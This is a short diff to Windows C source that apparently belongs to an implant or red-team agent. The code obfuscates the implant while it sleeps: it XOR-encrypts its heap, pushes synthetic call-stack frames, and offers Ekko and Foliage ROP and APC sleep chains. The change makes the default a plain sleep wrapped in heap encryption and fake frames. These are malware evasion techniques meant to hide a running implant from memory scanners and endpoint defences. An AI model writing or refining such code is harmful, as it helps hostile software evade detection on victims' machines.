@@ -39,7 +39,7 @@ typedef LONG NTSTATUS;
 /* 2 = Foliage — NtQueueApcThread/NtContinue APC chain               */
 /* ------------------------------------------------------------------ */
 #ifndef SLEEP_METHOD
-#define SLEEP_METHOD 1
+#define SLEEP_METHOD 0
 #endif
 
 /* ── Runtime string decryption helper ─────────────────────── */
@@ -563,26 +563,21 @@ foliage_fallback:
 static void encrypted_sleep(DWORD ms) {
     if (!g_heap_key_init) { Sleep(ms); return; }
 
-#if ENABLE_SYNTHETIC_FRAMES
-    {
-        static BOOL _synth_init = FALSE;
-        if (!_synth_init) { synth_frames_init(); _synth_init = TRUE; }
-        synth_frames_push();
-    }
-#endif
-
 #if SLEEP_METHOD == 1
     rop_sleep_ekko(ms);
 #elif SLEEP_METHOD == 2
     rop_sleep_foliage(ms);
 #else
+    /* Plain sleep: wrap with synthetic frames + heap XOR */
+#if ENABLE_SYNTHETIC_FRAMES
+    synth_frames_push();
+#endif
     heap_xor_all();
     Sleep(ms);
     heap_xor_all();
-#endif
-
 #if ENABLE_SYNTHETIC_FRAMES
     synth_frames_pop();
+#endif
 #endif
 }
 
